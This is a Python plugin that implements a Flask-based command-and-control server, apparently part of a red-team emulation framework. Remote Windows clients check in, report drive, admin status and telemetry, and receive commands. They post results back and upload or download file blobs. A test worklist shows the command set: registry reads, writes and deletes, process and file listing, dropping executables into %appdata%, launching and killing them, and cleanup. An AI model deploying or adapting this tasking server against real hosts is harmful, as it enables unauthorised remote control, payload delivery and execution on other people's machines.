
from os import environ as _environ
try:
    from ..src import controller_plugin as cp
    from .__harness_content import content as _content

except (ValueError, SystemError):  #allow this plugin to be run from commandline
    import os.path
    import sys
    _path = os.path.abspath(os.path.join(os.path.abspath(__file__), "../../"))
    sys.path.append(_path)
    from src import controller_plugin as cp
    from plugins.__harness_content import content as _content, command_templates as _command_templates
    #raise

from threading import Thread, Lock
from time import sleep, time
import json
from collections import defaultdict
from random import randint
from os import environ



__STANDALONE__ = False
_G_HARNESS = None
_G_LOCK = Lock()
_LOCK_WAIT = 3



class Harness(cp.ControllerPlugin):
    functionality = _command_templates

    def __init__(self):
        """
        The plugin class is the last class to init,
        but Database and logger have not started yet
        Should not be using the database handles or the logger in this fn
        """
        self.name = "Harness"
        if _environ["STAGE"] == "DEV":
            self.debug = True
        else:
            self.debug = False
        self.proto = "TCP"
        self._work = defaultdict(list)
        self._output = defaultdict(list)
        self._complete = defaultdict(list)
        self._clients = defaultdict(list)
        super().__init__(self.name, self.functionality)

    def _stop(self):
        self.LOGGER.send([
            self.name,
            self.name + " server shutting down...",
            20,
            time()
        ])
        exit(0)


    def _start(self, *args):
        """
        Start function is called by the supervisor only
        This function may assume the logger and the db is already start()ed
        This function should include all calls required to run until SIGTERM

        :return: This function calls exit! when complete
        """
        global _G_LOCK
        global _G_HARNESS
        _G_LOCK.acquire()
        _G_HARNESS = self

        if __STANDALONE__:
            self._populate_work("127.0.0.1")
        else:
            self._advertise_functionality()
        _G_LOCK.release()
        
        self._start_webserver()
        try:
            self._processing_loop() #blocks until ext_signal.value == True
        except KeyboardInterrupt:
            self._stop()
        finally:
            exit(0)

    def _processing_loop(self):
        """
        The main processing loop of this class.
        This loop will run forever until SIGTERM

        :return: None
        """
        while True:
            if _G_LOCK.acquire(timeout=_LOCK_WAIT):
                self._collect_new_jobs()
                self._push_complete_output()
                _G_LOCK.release()
            sleep(3)

    def _start_webserver(self):
        """
        Wraps the global webserver in a Thread object and starts it in the background.
        Flask happens to have a background start option
        Using <Thread> for consistency with this project.

        :return: <Thread> object holding the started web server
        """
        httpd_server = Thread(target=_app.run,
                              daemon=True,
                              kwargs={"host": "0.0.0.0",
                                      "port": self.port})
        httpd_server.start()
        return httpd_server

    def _collect_new_jobs(self):
        """
        Pulls at most one job from upstream and adds it to local tracking.
        :return: <bool> whether a not a job was added
        """
        new_job = self.request_job()  # <dict> or None
        if new_job:
            location = new_job['JobTarget']['Location']
            self._work[location].append(new_job)
        return bool(new_job)

    def _job_is_complete(self, client, output):
        """
        Plugin-internal function to set the job to complete status

        Caller MUST own G_LOCK

        Assumes at most 1 job per client at a time

        :param client: identifier for the external client
        :param output: arbitrary data <str><bytes><int>
        :return: None

        """
        if self._output[client]:
            cmd = self._output[client].pop(0)
            final_output = {"OutputJob": cmd,
                            "Content": output}
            _G_HARNESS._complete[client].append(final_output)

    def _push_complete_output(self):
        """
        Sends locally tracked complete output up the stack

        :return: None
        """
        for location in self._complete:
            if self._complete[location]:
                while self._complete[location]:
                    output = self._complete[location].pop(0)
                    job = output['OutputJob']
                    output_content = output['Content']
                    self.respond_output(job, output_content)
                    self._update_job_status(job['id'], "Done")

    def _provide_status_update(self, job_id, status):  # pragma: no cover
        """
        There are limited status updates the plugin can update.
        This code should probably be in the base class

        :param job_id:
        :param status:
        :return:
        """
        raise NotImplementedError

    def _put_blob_in_content_table(self, file_id, blob):  # pragma: no cover
        """
        Caller must own _G_LOCK
        Internal function only

        Job template may include a file buffer.
        Put/Get file must be translated to the _content table
        :param file_id:
        :param blob:
        :return:
        """
        raise NotImplementedError

    def _update_clients(self, client, telemetry):
        """
        caller MUST own _G_LOCK.  Caller may provide a <dict> object.

        :param client: <str> client's location
        :param telemetry:  <dict> any telemetry (must be JSONable)
        :return: None
        """
        self._clients[client] = telemetry


    def _populate_work(self, location):  # pragma: no cover
        '''
        This function is test  code intended to be removed once
            the plugin is integrated
        :param location: IP address of the calling hostname
        :return: None
        '''
        [self._work[location].append(x) for x in _translated_commands]

    def _convert_job(self, job):  # pragma: no cover
        '''
        Deprecated: Jobs should be in the new template format
        :param job:
        :return:
        '''
        loc = job['JobTarget']['Location']
        cmd = job['JobCommand']['CommandName']
        out = job['JobCommand']['Output']
        args = [job_input['Value'] for job_input in job['JobCommand']['Inputs']]
        return (loc, out, cmd, args)

    def _add_job_to_worklist(self, job):
        """
        Deprecated: Jobs should be in the new template format if added to the work list
        :param job:
        :return:
        """
        (loc, out, cmd, args) = self._convert_job(job)
        self._work[loc].append({"output":out,
                                "name":cmd,
                                "argv":args})

    def _dump_internal_worklist(self): # pragma: no cover
        """
        :return: string serialized copy of the current worklist
        """
        from json import dumps
        return dumps(self._work)

    def _translate_next_job(self, client):
        """
        Caller Must own _G_LOCK

        This plugin needs to job in a comma separated string
        <cmd>[,<arg1>,<arg2>...]

        :return: job traslated from PCP format to client format
        """
        command_string = "sleep,15000" #sleep for 15 seconds if nothing else
        if not self._output[client] and self._work[client]:
            cmd = self._work[client].pop(0)
            self._output[client].append(cmd)
            self._update_job_status(cmd['id'], "Active")
            if not cmd['JobCommand']['Output']: #FireandForget goes straight to complete
                self._job_is_complete(client, "")
            args = [x["Value"] for x in cmd['JobCommand']['Inputs']]
            str_args = ",".join(args)
            command_string = "{},{}".format(cmd['JobCommand']['CommandName'], str_args)
        return command_string



####------------------------------------------------------------------------------
####----  Everything below here should work with or without the interpreter
####------------------------------------------------------------------------------


from flask import Flask, request, stream_with_context, Response
#from flask import g, jsonify, render_template, abort


_i = 0

_translated_commands = [
    {"output":True,
     "name": "echo",
     "argv": ["Hello World"]},
    {"output":False,
     "name": "sleep",
     "argv": ["4000", ]},
    {"output":True,
     "name": "list_processes",
     "argv": []},
    {"output":True,
     "name": "list_files",
     "argv": ["%appdata%\\"]},
    {"output":True,
     "name": "read_registry",
     "argv": ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
              "ProgramFilesDir"]},
    {"output":False,
     "name": "write_registry",
     "argv": ["HKEY_CURRENT_USER\\Software\\Ramrod_Example",
              "Key1",
              "REG_SZ",
              "Ramrod testing 0x000000000000000"]},
    {"output":True,
     "name": "read_registry",
     "argv": ["HKEY_CURRENT_USER\\Software\\Ramrod_Example",
              "Key1"]},
    {"output":False,
     "name": "sleep",
     "argv": ["4000", ]},
    {"output":False,
     "name": "delete_registry",
     "argv": ["HKEY_CURRENT_USER\\Software\\Ramrod_Example"]},
    #this file pulls from _harness content
    #{"output":True,
    # "name":"get_file",
    # "argv":["399",
    #         "C:\\Users\\bauma\\Documents\\ait\\dumb_exe.exe"]},
    {"output":False,
     "name": "put_file",
     "argv": ["399",
              "%appdata%\\test_file-9000.exe"]},

    {"output":False,
     "name": "sleep",
     "argv": ["10000", ]},
    {"output":False,
     "name": "create_process",
     "argv": ["%appdata%\\test_file-9000.exe"]},
    #this file pulls from _harness content
    #{"output":True,
    # "name": "get_file",
    # "argv": ["501",
    #          "C:\\Users\\bauma\\Documents\\ait\\dumb_sleeper.exe"]},
    {"output":False,
     "name": "put_file",
     "argv": ["501",
              "%appdata%\\gosleep.exe"]},

    {"output": False,
     "name": "sleep",
     "argv": ["3000", ]},
    {"output": False,
     "name": "create_process",
     "argv": ["%appdata%\\gosleep.exe"]},
    {"output": False,
     "name": "sleep",
     "argv": ["30000"]},
    {"output": False,
     "name": "terminate_process",
     "argv": ["gosleep.exe"]},
    {"output":True,
     "name": "list_files",
     "argv": ["%appdata%"]},
    {"output":False,
     "name": "delete_file",
     "argv": ["%appdata%\gosleep.exe"]},
    {"output":False,
     "name": "delete_file",
     "argv": ["%appdata%\\test_file-9000.exe"]},
    {"output":True,
     "name": "list_files",
     "argv": ["%appdata%\\"]},
    {"output":False,
     "name": "terminate",
     "argv": []}
]

_app = Flask(__name__)
_app.config.from_object(__name__)

def parse_serial(serial):
    validated = {}
    potential = serial.split("_")
    if len(potential) == 3:
        validated["Drive"] = potential[0]
        validated["InternalLocation"] = potential[1]
        validated["Location"] = request.environ['REMOTE_ADDR']
        validated['Admin'] = potential[2]
        validated['ContactTime'] = time()
    return validated


@_app.before_request
def _before_request():
    pass


@_app.teardown_request
def _teardown_request(exception):
    pass


@_app.route("/harness/<serial>", methods=['GET'])
def _checkin(serial):
    validated = parse_serial(serial)
    remote = json.loads(json.dumps(request.args)) #formatted copy op
    validated['telemetry'] = remote
    # print ( validated )
    global _G_HARNESS
    global _G_LOCK
    command_string = "sleep,15000"
    if not __STANDALONE__ and _G_LOCK.acquire(timeout=_LOCK_WAIT):
        _G_HARNESS._update_clients(validated['Location'], validated)
        command_string = _G_HARNESS._translate_next_job(validated['Location'])
        _G_LOCK.release()
    elif __STANDALONE__:
        #pick random sleep or echo
        cmd = _translated_commands[randint(0,1)]
        command_string = "{},{}".format(cmd['name'],
                                        ",".join(cmd['argv']))
    return command_string


@_app.route("/response/<serial>", methods=['POST'])
def _respond_to_work(serial):
    validated = parse_serial(serial)
    print(request.form['data'])
    _handle_client_response(validated['Location'], request.form['data'])
    return "1"


@_app.route("/givemethat/<serial>/<file_id>", methods=['GET'])
def _get_blob(serial, file_id):
    validated = parse_serial(serial)
    def gens(file_id):
        if file_id in _content:
            file_content = _content[file_id]
            for next_byte in file_content:
                yield next_byte
    _handle_client_response(validated['Location'], file_id)
    return Response(stream_with_context(gens(file_id)))


@_app.route("/givemethat/<serial>/<file_id>", methods=['POST'])
def _put_blob(serial, file_id):
    validated = parse_serial(serial)
    _content[file_id] = request.form['data'] #TODO: Decide if files should be reused like this
    _handle_client_response(validated['Location'], request.form['data'])
    return "1"

def _handle_client_response(client, data):
    if not __STANDALONE__ and _G_LOCK.acquire(timeout=_LOCK_WAIT):
        _G_HARNESS._job_is_complete(client, data)
        _G_LOCK.release()

if __name__ == "__main__":
    from sys import argv
    from multiprocessing import Value
    from ctypes import c_bool
    if len(argv) < 2:
        __STANDALONE__ = True
        _app.run(debug=True, port=5005) #5005 is the non-default Debug port
    else:
        __STANDALONE__ = True
        ext_signal = Value(c_bool, False)
        test_harness = Harness()
        test_harness._start()
